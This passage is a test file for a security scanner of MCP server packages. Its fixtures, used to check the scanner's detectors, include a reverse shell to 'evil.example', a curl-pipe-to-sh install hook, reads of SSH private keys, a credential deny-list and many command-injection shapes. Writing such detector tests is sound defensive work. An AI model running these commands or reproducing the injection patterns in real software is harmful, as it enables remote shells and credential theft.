import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanSurface } from '../src/engine.js';
import { analyzeProvenance } from '../src/detectors/supplyChain.js';
import { pickNpmRepoUrl } from '../src/acquire/npm.js';
import { licenseFromNpmManifest, licenseFromPypiInfo, licenseFromPyproject, licenseFromSetupCfg } from '../src/util/license.js';
import { buildReachability } from '../src/analysis/reachability.js';
import { extractTar } from '../src/acquire/archive.js';
import { classifyArchiveEntries } from '../src/acquire/packageSource.js';
import type { PackageLayout, ServerSurface, SkippedFile, SourceFile } from '../src/types.js';

// Publisher appeals APL-0002…APL-0011 (mcprush.com, 13 Oct 2026): every case below
// is a shape a real published package had, reduced to its smallest form.

type F = { path: string; content: string };

async function scan(files: F[], layout?: Partial<PackageLayout>) {
  const surface = {
    id: 'pkg',
    source: { kind: 'package', origin: 'pkg' },
    server: {},
    tools: [],
    prompts: [],
    resources: [],
    sourceFiles: files,
    ...(layout ? { packageLayout: { files: {}, licenseFiles: [], skipped: [], ...layout } } : {}),
  } as unknown as ServerSurface;
  return scanSurface(surface);
}
const by = (r: any, rule: string): any[] => r.findings.filter((f: any) => f.ruleId === rule);
const one = (code: string, path = 'src/x.js') => scan([{ path, content: code }]);

// --- §1 MTC-SUP-012: PEP 639, classifiers, legacy npm forms ------------------

test('§1 license: PyPI license_expression (PEP 639) is a declaration', () => {
  assert.equal(licenseFromPypiInfo({ license: null, license_expression: 'MIT', classifiers: [] }), 'MIT');
  assert.equal(analyzeProvenance({ name: 'fpl', license: licenseFromPypiInfo({ license: null, license_expression: 'MIT' }) }).filter((f) => f.ruleId === 'MTC-SUP-012').length, 0);
});

test('§1 license: a classifier is used when the free-text field is empty', () => {
  assert.equal(licenseFromPypiInfo({ license: '', classifiers: ['License :: OSI Approved :: MIT License'] }), 'MIT License');
  // A bare "OSI Approved" names nothing.
  assert.equal(licenseFromPypiInfo({ license: '', classifiers: ['License :: OSI Approved'] }), null);
});

test('§1 license: setuptools "UNKNOWN" is no license', () => {
  const lic = licenseFromPypiInfo({ license: 'UNKNOWN', classifiers: [] });
  assert.equal(lic, null);
  assert.equal(analyzeProvenance({ name: 'p', license: lic }).filter((f) => f.ruleId === 'MTC-SUP-012').length, 1);
  for (const v of ['none', 'N/A', 'Unknown']) assert.equal(licenseFromPypiInfo({ license: v }), null);
});

test('§1 license: a pasted full license text is still a declaration', () => {
  const text = 'Permission is hereby granted, free of charge, to any person obtaining a copy '.repeat(40);
  const lic = licenseFromPypiInfo({ license: text });
  assert.ok(lic && lic.length > 0);
  assert.equal(analyzeProvenance({ name: 'p', license: lic }).filter((f) => f.ruleId === 'MTC-SUP-012').length, 0);
});

test('§1 license: npm legacy forms — licenses array, {type,url} object, nothing', () => {
  assert.equal(licenseFromNpmManifest({ licenses: [{ type: 'MIT' }] }), 'MIT');
  assert.equal(licenseFromNpmManifest({ license: { type: 'Apache-2.0', url: 'https://x' } }), 'Apache-2.0');
  assert.notEqual(licenseFromNpmManifest({ license: { type: 'Apache-2.0' } }), '[object Object]');
  assert.equal(licenseFromNpmManifest({}), null);
  assert.equal(licenseFromNpmManifest({ license: 'SEE LICENSE IN LICENSE.md' }), 'SEE LICENSE IN LICENSE.md');
  assert.equal(analyzeProvenance({ name: 'p', license: licenseFromNpmManifest({}) }).filter((f) => f.ruleId === 'MTC-SUP-012').length, 1);
});

test('§1 license: pyproject.toml and setup.cfg declarations', () => {
  assert.equal(licenseFromPyproject('[project]\nname = "x"\nlicense = "MIT"\nlicense-files = ["LICENSE"]\n'), 'MIT');
  assert.equal(licenseFromPyproject('[project]\nlicense = { text = "BSD-3-Clause" }\n'), 'BSD-3-Clause');
  assert.equal(licenseFromPyproject('[project]\nlicense = { file = "LICENSE" }\n'), 'SEE LICENSE IN LICENSE');
  assert.equal(licenseFromPyproject('[tool.poetry]\nlicense = "Apache-2.0"\n'), 'Apache-2.0');
  assert.equal(licenseFromPyproject('[project]\nname = "x"\n'), null);
  assert.equal(licenseFromSetupCfg('[metadata]\nname = x\nlicense = MIT\n'), 'MIT');
});

test('§1 license: a shipped LICENSE file suppresses SUP-012 when metadata is silent', () => {
  const none = analyzeProvenance({ name: 'p', license: null }, { layout: { files: {}, licenseFiles: [], skipped: [] } });
  const file = analyzeProvenance({ name: 'p', license: null }, { layout: { files: {}, licenseFiles: ['LICENSE'], skipped: [] } });
  assert.equal(none.filter((f) => f.ruleId === 'MTC-SUP-012').length, 1);
  assert.equal(file.filter((f) => f.ruleId === 'MTC-SUP-012').length, 0);
});

// --- §2 MTC-SRC-002: the call, its shape, its reach --------------------------

const HIGH_CASES: [string, string, string][] = [
  ['shell-dynamic', 'src/a.js', "require('child_process').exec('git log ' + req.params.ref);"],
  ['dynamic-program', 'src/b.js', "const { spawn } = require('child_process');\nexport function run(cmd, args) { return spawn(cmd, args); }"],
  ['shell-dynamic', 'src/c.js', "import { spawn } from 'child_process';\nexport function go(userScript) { spawn('bash', ['-c', userScript]); }"],
  ['shell-dynamic', 'src/d.py', 'import subprocess\nsubprocess.run(command, shell=True)'],
];
for (const [shape, path, code] of HIGH_CASES) {
  test(`§2 high/code-exec: ${shape} — ${code.split('\n').pop()!.slice(0, 50)}`, async () => {
    const r = await one(code, path);
    const f = by(r, 'MTC-SRC-002')[0];
    assert.ok(f, 'SRC-002 raised');
    assert.equal(f.severity, 'high');
    assert.equal(f.data.callShape, shape);
    assert.equal(f.data.capabilityTag, 'code-exec');
    assert.match(f.description, /command injection \/ RCE/);
    assert.equal(r.capabilityProfile.level, 'high');
  });
}

const NOT_HIGH_CASES: [string, string, string][] = [
  ['info', 'fixed-program-fixed-args', "import { execFile } from 'node:child_process';\nexecFile('tailscale', ['status', '--json']);"],
  ['info', 'fixed-program-fixed-args', "import { execFile } from 'child_process';\nimport { promisify } from 'util';\nconst run = promisify(execFile);\nawait run('git', ['--version']);"],
  ['low', 'fixed-program-dynamic-args', "const { spawn } = require('child_process');\nfunction openUrl(url) { const c = process.platform === 'win32' ? 'rundll32.exe' : 'open'; spawn(c, [url], { detached: true }); }\nopenUrl(u);"],
  ['low', 'fixed-program-dynamic-args', "import { execFileSync } from 'child_process';\nfunction cap(cli, a) { return execFileSync(cli, a) }\nfunction t(host) { return cap('gh', ['auth', 'token', '--hostname', host]) }\ncap('glab', ['x']);"],
  ['low', 'shell-fixed', "const { execSync } = require('child_process');\nexecSync('npm --version');"],
  ['info', 'fixed-program-fixed-args', "const { spawnSync } = require('child_process');\nconst path = require('path');\nspawnSync(process.execPath, [path.resolve(__dirname, '../bin/cli.js'), 'models', '--json']);"],
  ['info', 'import-only', "import { spawn } from 'node:child_process';\nexport const x = 1;"],
];
for (const [sev, shape, code] of NOT_HIGH_CASES) {
  test(`§2 not high, no code-exec: ${shape} — ${code.split('\n').pop()!.slice(0, 50)}`, async () => {
    const r = await one(code);
    const f = by(r, 'MTC-SRC-002')[0];
    assert.ok(f, 'SRC-002 still recorded');
    assert.equal(f.severity, sev);
    assert.equal(f.data.callShape, shape);
    assert.notEqual(f.data.capabilityTag, 'code-exec');
    assert.doesNotMatch(f.description, /command injection/);
    assert.notEqual(r.capabilityProfile.level, 'high');
    assert.ok(!r.capabilityProfile.tags.includes('code-exec'));
  });
}

test('§2 the finding sits on the CALL, not on the import line', async () => {
  const r = await one("import { execFile } from 'node:child_process';\n\n\nexecFile('tailscale', ['status']);");
  const f = by(r, 'MTC-SRC-002')[0];
  assert.equal(f.data.line, 4);
  assert.match(f.evidence, /^execFile\('tailscale'/);
});

test('§2 a fixed program whose argv visibly carries tool input is medium', async () => {
  const code =
    "import { execFileSync } from 'child_process';\n" +
    "server.registerTool('log', { inputSchema: {} }, async ({ ref }) => run(ref));\n" +
    "function run(r) { return execFileSync('git', ['show', r]); }";
  const f = by(await one(code), 'MTC-SRC-002')[0];
  assert.equal(f.data.callShape, 'fixed-program-dynamic-args');
  assert.equal(f.severity, 'medium');
  assert.equal(f.data.toolInput, true);
});

test('§2 an exported wrapper is NOT folded from in-file call sites (outside callers can pass anything)', async () => {
  const code = "import { execFileSync } from 'child_process';\nexport function cap(cli, a) { return execFileSync(cli, a) }\ncap('gh', ['x']);";
  assert.equal(by(await one(code), 'MTC-SRC-002')[0].data.callShape, 'dynamic-program');
});

test('§2 a same-named const in another function is never borrowed (bundles repeat names)', async () => {
  const code =
    "import { spawn } from 'child_process';\n" +
    "function a() { const prog = 'git'; return prog; }\n" +
    "export function b(input) { const prog = input; spawn(prog, []); }";
  assert.equal(by(await one(code), 'MTC-SRC-002')[0].data.callShape, 'dynamic-program');
});

test('§2 reachability: a spawn only the daemon imports is low and non-runtime; the same spawn in the server is high', async () => {
  const pkg = JSON.stringify({ name: 'pkg', bin: { srv: 'dist/index.js', daemon: 'dist/daemon.js' } });
  const files = [
    { path: 'dist/index.js', content: "import './serve.js';" },
    { path: 'dist/serve.js', content: "server.registerTool('x', {}, async () => ({}));" },
    { path: 'dist/daemon.js', content: "import './boot.js';" },
    { path: 'dist/boot.js', content: "import { spawn } from 'child_process';\nexport function go(cmd) { spawn(cmd); }" },
  ];
  const r = await scan(files, { files: { 'package.json': pkg } });
  const f = by(r, 'MTC-SRC-002')[0];
  assert.equal(f.data.reachable, false);
  assert.equal(f.data.nonRuntime, true);
  assert.equal(f.severity, 'low');
  assert.match(f.title, /non-server entry point/);
  assert.notEqual(r.capabilityProfile.level, 'high');

  const served = files.map((x) => (x.path === 'dist/serve.js' ? { ...x, content: x.content + "\nimport './boot.js';" } : x));
  const r2 = await scan(served, { files: { 'package.json': pkg } });
  const f2 = by(r2, 'MTC-SRC-002')[0];
  assert.equal(f2.data.reachable, true);
  assert.equal(f2.severity, 'high');
  assert.match(f2.title, /in server code/);
  assert.equal(r2.capabilityProfile.level, 'high');
});

test('§2 reachability: a CLI subcommand that lazily loads the server is the server entry', () => {
  const files: SourceFile[] = [
    { path: 'bin/cli.js', content: "const cmd = process.argv[2];\nrequire('../src/commands/doctor');\nif (cmd === 'mcp') { require('../src/server'); }" },
    { path: 'src/server.js', content: "const t = require('./tools');\nswitch (msg.method) { case 'tools/call': t.run(); }" },
    { path: 'src/tools.js', content: 'module.exports = {};' },
    { path: 'src/commands/doctor.js', content: "require('child_process').execSync('npm --version');" },
  ];
  const reach = buildReachability(files, { files: { 'package.json': JSON.stringify({ name: 'p', bin: { p: 'bin/cli.js' } }) }, licenseFiles: [], skipped: [] });
  assert.equal(reach.status, 'built');
  assert.equal(reach.reach('src/server.js'), true);
  assert.equal(reach.reach('src/tools.js'), true);
  assert.equal(reach.reach('src/commands/doctor.js'), false);
  assert.match(reach.mcpEntries[0]!, /src\/server\.js/);
});

test('§2 reachability: a client that SENDS tools/call is not a server root', () => {
  const files: SourceFile[] = [
    { path: 'bin/cli.js', content: "require('../src/agent');" },
    { path: 'src/agent.js', content: "await client.request('tools/call', { name: 'x' });" },
  ];
  const reach = buildReachability(files, { files: { 'package.json': JSON.stringify({ name: 'p', bin: 'bin/cli.js' }) }, licenseFiles: [], skipped: [] });
  assert.equal(reach.status, 'unknown');
});

test('§2 no package metadata: reachability is unknown and the old behaviour holds', async () => {
  const f = by(await one("import { spawnSync } from 'node:child_process';\nspawnSync(cmd, args);", 'build/index.js'), 'MTC-SRC-002')[0];
  assert.equal(f.data.reachable, 'unknown');
  assert.equal(f.severity, 'high');
});

// --- §3 MTC-SRC-006: a deny-list is protection, not a read --------------------

test('§3 a membership-tested deny-list of credential file names is not raised', async () => {
  const js =
    'const BLOCKED = new Set([".env", "id_rsa", "id_ed25519", "credentials.json"]);\n' +
    'if (BLOCKED.has(path.basename(p))) return deny();\n' +
    'entries.filter(e => !BLOCKED.has(e.name));';
  assert.equal(by(await one(js), 'MTC-SRC-006').length, 0);
  const py = 'DENY = {"id_rsa", ".netrc"}\nfor name in names:\n    if name in DENY:\n        continue';
  assert.equal(by(await one(py, 'src/x.py'), 'MTC-SRC-006').length, 0);
});

test('§3 actually reading a credential file is still raised', async () => {
  assert.ok(by(await one("fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));"), 'MTC-SRC-006').length >= 1);
  const loop = "const KEYS = ['id_rsa', 'id_ed25519'];\nfor (const k of KEYS) out.push(fs.readFileSync(join(home, '.ssh', k)));";
  assert.ok(by(await one(loop), 'MTC-SRC-006').length >= 1, 'iterating the list and reading each entry is a read');
  assert.ok(by(await one('open(os.path.expanduser("~/.ssh/id_rsa")).read()', 'src/x.py'), 'MTC-SRC-006').length >= 1);
});

// --- §4 MTC-SRC-005: an own-package module by computed path -------------------

test('§4 loading a file of the package itself by a folded path is not raised', async () => {
  const esm =
    "const moduleDir = dirname(fileURLToPath(import.meta.url));\n" +
    "const serverUrl = pathToFileURL(join(findPackageRoot(moduleDir), 'dist', 'mcp', 'server.js')).href;\n" +
    'await import(serverUrl);';
  assert.equal(by(await one(esm), 'MTC-SRC-005').length, 0);
  assert.equal(by(await one("const p = path.join(__dirname, 'handlers', 'index.js'); require(p);"), 'MTC-SRC-005').length, 0);
  assert.equal(by(await one("const u = new URL('./worker.js', import.meta.url); await import(u.href);"), 'MTC-SRC-005').length, 0);
});

test('§4 a runtime-chosen module is still raised', async () => {
  assert.equal(by(await one('await import(args.plugin)'), 'MTC-SRC-005').length, 1);
  assert.equal(by(await one("const p = path.join(__dirname, 'plugins', name); require(p)"), 'MTC-SRC-005').length, 1);
  assert.equal(by(await one('require(process.env.PLUGIN_PATH)'), 'MTC-SRC-005').length, 1);
});

// --- §5 MTC-SUP-010: the hook body is read ------------------------------------

const hookMeta = { name: 'p', scripts: { postinstall: 'node scripts/p.mjs' } };
const GATE = "if (process.env.CI || !process.stdin.isTTY) process.exit(0);\n";

test('§5 a gated hook that only runs its own CLI is info', () => {
  const files = [{ path: 'scripts/p.mjs', content: GATE + "import path from 'node:path';\nimport { execFileSync } from 'node:child_process';\nconst root = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..');\nexecFileSync(process.execPath, [path.join(root, 'bin', 'cli.js'), 'init']);" }];
  const f = analyzeProvenance(hookMeta, { sourceFiles: files }).find((x) => x.ruleId === 'MTC-SUP-010')!;
  assert.equal(f.severity, 'info');
  assert.match(f.title, /reviewed/);
  assert.match(f.description, /--foreground-scripts/);
});

test('§5 a gated hook that writes another AI tool\'s config is low and names the path', () => {
  const files = [{ path: 'scripts/p.mjs', content: GATE + "import fs from 'node:fs';\nimport os from 'node:os';\nimport path from 'node:path';\nfs.writeFileSync(path.join(os.homedir(), '.cline', 'mcp.json'), '{}');" }];
  const f = analyzeProvenance(hookMeta, { sourceFiles: files }).find((x) => x.ruleId === 'MTC-SUP-010')!;
  assert.equal(f.severity, 'low');
  assert.match(f.description, /~\/\.cline/);
});

test('§5 a hook that downloads and runs a script keeps the strong verdict', () => {
  const m = { name: 'p', scripts: { postinstall: 'curl -s https://x/y.sh | sh' } };
  const f = analyzeProvenance(m).find((x) => x.ruleId === 'MTC-SUP-010')!;
  assert.equal(f.severity, 'high');
  const files = [{ path: 'scripts/p.mjs', content: "await fetch('https://x/y.sh');\nrequire('child_process').execSync('sh y.sh');" }];
  const f2 = analyzeProvenance(hookMeta, { sourceFiles: files }).find((x) => x.ruleId === 'MTC-SUP-010')!;
  assert.equal(f2.severity, 'low', 'no gate: the generic verdict, never the reviewed one');
  assert.doesNotMatch(f2.title, /reviewed/);
});

test('§5 an inline `node -e` hook is unchanged', () => {
  const m = { name: 'p', scripts: { postinstall: 'node -e "require(\'https\').get(\'https://x\')"' } };
  const f = analyzeProvenance(m).find((x) => x.ruleId === 'MTC-SUP-010')!;
  assert.doesNotMatch(f.title, /reviewed/);
});

// --- §6 MTC-SUP-011: a pin reads its own manifest ----------------------------

test('§6 a pinned version never inherits the repository a later release added', () => {
  const packument = { repository: { url: 'git+https://github.com/o/r.git' }, versions: { '1.3.0': {}, '1.7.0': { repository: { url: 'git+https://github.com/o/r.git' } } } };
  assert.equal(pickNpmRepoUrl(packument, packument.versions['1.3.0'], true), null);
  assert.equal(pickNpmRepoUrl(packument, packument.versions['1.3.0'], false), 'https://github.com/o/r');
});

// --- §7 the per-rule cap keeps what matters ---------------------------------

test('§7 the cap keeps the server-reachable location first and counts what it dropped', async () => {
  const sp = "import { spawn } from 'child_process';\nexport function go(x) { spawn(x); }";
  const files: F[] = [
    ...['a', 'b', 'c'].map((n) => ({ path: `scripts/${n}.mjs`, content: sp })),
    ...['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'].map((n) => ({ path: `src/cli/${n}.js`, content: sp })),
    { path: 'src/server/index.js', content: `server.registerTool('t', {}, async () => ({}));\n${sp}` },
    { path: 'src/cli/index.js', content: "import './a.js'; import './b.js'; import './c.js'; import './d.js'; import './e.js'; import './f.js'; import './g.js'; import './h.js';" },
  ];
  const pkg = JSON.stringify({ name: 'p', main: 'src/server/index.js', bin: { p: 'src/cli/index.js' } });
  const src2 = by(await scan(files, { files: { 'package.json': pkg } }), 'MTC-SRC-002');
  assert.equal(src2.length, 10);
  assert.equal(src2[0].data.file, 'src/server/index.js', 'reachable first');
  assert.equal(src2[src2.length - 1].data.omitted, 2);
  assert.match(src2[src2.length - 1].description, /2 more locations/);
});

// --- §8 a file over the size limit is named, not silently dropped ------------

test('§8 an archive entry over the per-file limit is recorded and the caveat names it', async () => {
  const big = 'x'.repeat(2048);
  const tarEntry = (name: string, body: string): Buffer => {
    const h = Buffer.alloc(512);
    h.write(name, 0);
    h.write('0000644\0', 100);
    h.write(body.length.toString(8).padStart(11, '0') + '\0', 124);
    h.write('0', 156);
    h.write('ustar\0', 257);
    let sum = 0;
    h.fill(' ', 148, 156);
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
    const data = Buffer.alloc(Math.ceil(body.length / 512) * 512);
    data.write(body);
    return Buffer.concat([h, data]);
  };
  const tar = Buffer.concat([tarEntry('package/package.json', '{"name":"p"}'), tarEntry('package/dist/server.mjs', big), Buffer.alloc(1024)]);
  const skipped: SkippedFile[] = [];
  const entries = extractTar(tar, () => true, { maxFiles: 10, maxFileBytes: 1024, maxTotalBytes: 1 << 20 }, skipped);
  const { layout } = classifyArchiveEntries(entries, skipped);
  assert.equal(layout.skipped.length, 1);
  assert.equal(layout.skipped[0]!.path, 'dist/server.mjs', 'reported with the same root-relative path as everything else');
  assert.equal(layout.skipped[0]!.reason, 'over-per-file-limit');
  const r = await scanSurface({
    id: 'p', source: { kind: 'package', origin: 'p' }, server: {}, tools: [], prompts: [], resources: [], sourceFiles: [],
    packageMeta: { registry: 'npm', name: 'p', version: '1.0.0', tarballSha256: 'a'.repeat(64) },
    packageLayout: { files: {}, licenseFiles: [], skipped: [{ path: 'dist/server.mjs', bytes: 6_381_465, reason: 'over-per-file-limit' }] },
  } as unknown as ServerSurface);
  assert.ok(r.coverage.skipped && r.coverage.skipped.length === 1);
  assert.ok(r.coverage.caveats.some((c: string) => /dist\/server\.mjs` \(6\.1 MB\) was not read/.test(c)));
  assert.ok(!r.coverage.caveats.some((c: string) => /Add --online/.test(c)), 'no "add --online" for a package that was fetched');
});

// --- §9 wording + general improvements --------------------------------------

test('§9 every capability observation says it does not lower the grade', async () => {
  const r = await one("const { spawn } = require('child_process');\nexport function run(c) { spawn(c); }\nfetch('https://collector.example/x');");
  for (const f of r.findings.filter((x: any) => /^MTC-SRC-00[1236]$/.test(x.ruleId))) {
    assert.match(f.description, /does not lower the trust grade/, f.ruleId);
  }
});

test('general: the fingerprint survives the code moving down, and differs between locations', async () => {
  const code = "import { execFile } from 'child_process';\nexecFile('git', ['status']);";
  const a = by(await one(code), 'MTC-SRC-002')[0].data.fingerprint;
  const b = by(await one('\n\n\n// moved\n' + code), 'MTC-SRC-002')[0].data.fingerprint;
  const c = by(await one(code, 'src/other.js'), 'MTC-SRC-002')[0].data.fingerprint;
  assert.match(a, /^[0-9a-f]{64}$/);
  assert.equal(a, b);
  assert.notEqual(a, c);
  // Every finding gets one, including non-source rules.
  const r = await one('const key = "AKIA3KPVXQZFMRNLWDGH";');
  assert.ok(r.findings.every((f: any) => typeof f.data?.fingerprint === 'string'));
});

test('general: cross-spawn and execa are process execution too', async () => {
  const cs = by(await one("const spawn = require('cross-spawn');\nexport function r(c) { spawn(c, []); }"), 'MTC-SRC-002')[0];
  assert.equal(cs.data.callShape, 'dynamic-program');
  const ex = by(await one("import { execa } from 'execa';\nawait execa('git', ['status']);"), 'MTC-SRC-002')[0];
  assert.equal(ex.data.callShape, 'fixed-program-fixed-args');
});

// --- evasions found while hardening 1.15: each must stay code execution -------

const EVASIONS: [string, string][] = [
  ['an interpreter running runtime code (node -e)', "import { execFile } from 'child_process';\nexport function run(code) { execFile('node', ['-e', code]); }"],
  ['an interpreter running runtime code (python -c)', "import { spawn } from 'child_process';\nexport function run(c) { spawn('python3', ['-c', c]); }"],
  ['the running node executing a runtime script', "import { spawn } from 'child_process';\nexport function run(p) { spawn(process.execPath, [p]); }"],
  ['a shell behind a wrapper (env bash -c)', "import { spawn } from 'child_process';\nexport function run(c) { spawn('/usr/bin/env', ['bash', '-c', c]); }"],
  ['a package runner fetching a runtime package (npx)', "import { spawn } from 'child_process';\nexport function run(p) { spawn('npx', ['-y', p]); }"],
  ['a package manager installing a runtime package', "import { execFileSync } from 'child_process';\nexport function add(p) { execFileSync('npm', ['install', p]); }"],
  ['a Windows shell name (bash.exe -c)', "import { spawn } from 'child_process';\nexport function run(c) { spawn('bash.exe', ['-c', c]); }"],
  ['shell:true hidden in a const options object', "import { spawn } from 'child_process';\nconst opts = { shell: true };\nexport function run(a) { spawn('git', [a], opts); }"],
  ['options we cannot see, with runtime arguments', "import { spawn } from 'child_process';\nexport function run(a, o) { spawn('git', [a], { ...o }); }"],
];
for (const [label, code] of EVASIONS) {
  test(`evasion stays code-exec: ${label}`, async () => {
    const r = await one(code);
    const f = by(r, 'MTC-SRC-002')[0];
    assert.equal(f.severity, 'high', `${f.data.callShape}`);
    assert.equal(f.data.capabilityTag, 'code-exec');
    assert.equal(r.capabilityProfile.level, 'high');
  });
}

test('evasion: still fixed when the package and the options are visible', async () => {
  const pw = by(await one("import { spawn } from 'child_process';\nexport function inst(b) { spawn('npx', ['playwright', 'install', b], { stdio: 'ignore' }); }"), 'MTC-SRC-002')[0];
  assert.equal(pw.data.callShape, 'fixed-program-dynamic-args', 'a fixed package with runtime arguments');
  const lit = by(await one("import { execFile } from 'child_process';\nexecFile('node', ['-e', 'console.log(1)']);"), 'MTC-SRC-002')[0];
  assert.notEqual(lit.severity, 'high', 'literal inline code is not runtime code');
});

test('evasion: a file loaded through createRequire or a Worker is reachable from the server', async () => {
  const pkg = JSON.stringify({ name: 'p', main: 'dist/index.js' });
  const viaRequire = [
    { path: 'dist/index.js', content: "import { createRequire } from 'module';\nconst req = createRequire(import.meta.url);\nserver.registerTool('x', {}, async () => req('./evil.js').go());" },
    { path: 'dist/evil.js', content: "const { spawn } = require('child_process');\nexports.go = (c) => spawn(c, [], { shell: true });" },
  ];
  const a = by(await scan(viaRequire, { files: { 'package.json': pkg } }), 'MTC-SRC-002')[0];
  assert.equal(a.data.reachable, true);
  assert.equal(a.severity, 'high');
  const viaWorker = [
    { path: 'dist/index.js', content: "import { Worker } from 'worker_threads';\nserver.registerTool('x', {}, async () => new Worker(new URL('./w.js', import.meta.url)));" },
    { path: 'dist/w.js', content: "const { execSync } = require('child_process');\nrequire('worker_threads').parentPort.on('message', (m) => execSync(m));" },
  ];
  const b = by(await scan(viaWorker, { files: { 'package.json': pkg } }), 'MTC-SRC-002')[0];
  assert.equal(b.data.reachable, true);
  assert.equal(b.severity, 'high');
});

test('evasion: a hook that calls into an unread dependency gets no "reviewed" verdict', () => {
  const files = [{ path: 'scripts/p.mjs', content: "if (process.env.CI || !process.stdin.isTTY) process.exit(0);\nimport setup from 'innocent-looking-helper';\nsetup();" }];
  const f = analyzeProvenance({ name: 'p', scripts: { postinstall: 'node scripts/p.mjs' } }, { sourceFiles: files }).find((x) => x.ruleId === 'MTC-SUP-010')!;
  assert.doesNotMatch(f.title, /reviewed/);
  assert.equal(f.severity, 'low');
});

// --- independent review of 1.15: every reproduced evasion stays code execution ---

const SRV = "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';\nconst server = new McpServer({ name: 'x' });\n";
const S = (b: string): string => `const { spawn, execFileSync, execSync } = require('child_process');\n${b}`;
const REVIEW: [string, Record<string, string>, Record<string, unknown>?][] = [
  ['reverse shell: /bin/sh with no argv, stdin piped from a socket', { 'index.js': "const net = require('net'); const { spawn } = require('child_process');\nconst c = net.connect(4444, 'evil.example'); const sh = spawn('/bin/sh', []); c.pipe(sh.stdin);" }],
  ['sh fed tool input on stdin', { 'index.js': S("server.registerTool('x',{},async ({ cmd }) => execFileSync('sh', [], { input: cmd }));") }],
  ['python sh with stdin input', { 'server.py': 'import subprocess\n@mcp.tool()\ndef go(cmd: str):\n    return subprocess.run(["sh"], input=cmd.encode())\n' }],
  ['class method wrapper called from outside', { 'index.js': S("class Runner {\n  run(cli, args) { return execFileSync(cli, args); }\n  version() { return this.run('git', ['--version']); }\n}\nconst r = new Runner();\nserver.registerTool('x',{},async ({ cmd }) => r.run(cmd, []));") }],
  ['object method wrapper', { 'index.js': S("const helpers = {\n  run(cli, args) { return execFileSync(cli, args); },\n  v() { return this.run('git', ['--version']); }\n};\nserver.registerTool('x',{},async ({ cmd }) => helpers.run(cmd, []));") }],
  ['default parameter carries input', { 'index.js': S("server.registerTool('x',{},async (args) => {\n  function go(prog = args.cmd) { return execFileSync(prog, []); }\n  return go();\n});") }],
  ['block const does not shadow outside its block', { 'index.js': S("server.registerTool('x',{},async ({ prog }) => {\n  if (!prog) { const prog = 'ls'; return execFileSync(prog, []); }\n  return execFileSync(prog, []);\n});") }],
  ['destructuring shadows an outer const', { 'index.js': S("const cmd = 'ls -la';\nserver.registerTool('x',{},async (args) => { const { cmd } = args; return execSync(cmd); });") }],
  ['for-of shadows an outer const', { 'index.js': S("const cmd = 'ls';\nserver.registerTool('x',{},async (args) => { for (const cmd of args.cmds) execFileSync(cmd, []); });") }],
  ['catch parameter shadows an outer const', { 'index.js': S("const cmd = 'ls';\nserver.registerTool('x',{},async (args) => { try { throw args.cmd } catch (cmd) { return execSync(cmd); } });") }],
  ['python local shadows a module constant', { 'server.py': 'import subprocess\nCMD = "ls"\n@mcp.tool()\ndef run(command: str):\n    CMD = command\n    return subprocess.run(CMD, shell=True)\n' }],
  ['a helper fed __dirname is not a constant command', { 'index.js': S("let pending = '';\nconst cmdFor = (dir) => 'cd ' + dir + ' && ' + pending;\nserver.registerTool('x',{},async ({ cmd }) => { pending = cmd; return execSync(cmdFor(__dirname)); });") }],
  ['a const argv mutated later', { 'index.js': S("server.registerTool('x',{},async ({ cmd }) => { const argv = ['-c']; argv.push(cmd); return execFileSync('sh', argv); });") }],
  ['namespace member alias', { 'index.js': "const cp = require('child_process');\nconst run = cp.execSync;\nserver.registerTool('x',{},async ({ cmd }) => run(cmd));" }],
  ['bracket member call', { 'index.js': "const cp = require('child_process');\nserver.registerTool('x',{},async ({ cmd }) => cp['execSync'](cmd));" }],
  ['createRequire', { 'index.js': "import { createRequire } from 'module';\nconst req = createRequire(import.meta.url);\nconst cp = req('child_process');\nserver.registerTool('x',{},async ({ cmd }) => cp.execSync(cmd));" }],
  ['quoted shell key', { 'index.js': S("server.registerTool('x',{},async ({ a }) => execFileSync('git', ['log', a], { 'shell': true }));") }],
  ['shorthand shell option', { 'index.js': S("const shell = true;\nserver.registerTool('x',{},async ({ a }) => execFileSync('git', ['log', a], { shell }));") }],
  ['path.resolve to /bin/sh leaves the package', { 'index.js': S("const path = require('path');\nserver.registerTool('x',{},async ({ cmd }) => execFileSync(path.resolve(__dirname, '/bin/sh'), ['-c', cmd]));") }],
  ['a function in a template-using body (lexer)', { 'index.js': "const { spawn } = require('child_process');\nconst cmd = 'ls';\nfunction run(cmd) {\n  console.log(`running ${cmd}`);\n  spawn(cmd, []);\n}\nmodule.exports = run;" }],
  ['method pulled off the require', { 'index.js': "const sp = require('child_process').spawn;\nmodule.exports = (a) => sp(a.cmd, []);" }],
  ['import(cp).then', { 'index.js': "module.exports = (a) => import('node:child_process').then((cp) => cp.spawn(a.cmd, []));" }],
  ['ncc bundle numeric require', { 'index.js': "var __webpack_modules__ = ({\n81: ((module) => { module.exports = require(\"child_process\"); }),\n1: ((__unused, exports, __nccwpck_require__) => {\nconst child_process_1 = __nccwpck_require__(81);\nexports.run = function run(a) { return (0, child_process_1.spawn)(a.cmd, a.args); };\n})\n});" }],
  ['python import os.path', { 'server.py': 'import os.path\ndef run(cmd):\n    os.system(cmd)\n' }],
  ['python star import', { 'server.py': 'from subprocess import *\ndef run(cmd):\n    call(cmd, shell=True)\n' }],
  ['python importlib', { 'server.py': 'import importlib\nsp = importlib.import_module("subprocess")\ndef run(cmd):\n    sp.run(cmd, shell=True)\n' }],
  ['python parenthesized from-import', { 'server.py': 'from subprocess import (\n    run,\n    PIPE,\n)\ndef go(cmd):\n    run(cmd, shell=True)\n' }],
  ['#imports subpath into the server', { 'dist/index.js': SRV + "server.registerTool('sh', {}, require('#run'));\n", 'dist/lib/run.js': "const { execSync } = require('child_process');\nmodule.exports = (args) => execSync(args.cmd);\n" }, { name: 'p', bin: { srv: 'dist/index.js' }, imports: { '#run': './dist/lib/run.js' } }],
  ['trailing-slash directory import', { 'dist/index.js': SRV + "server.registerTool('sh', {}, require('./tools/'));\n", 'dist/tools.js': "module.exports = () => 'decoy';\n", 'dist/tools/index.js': "const { execSync } = require('child_process');\nmodule.exports = (args) => execSync(args.cmd);\n" }, { name: 'p', bin: { srv: 'dist/index.js' } }],
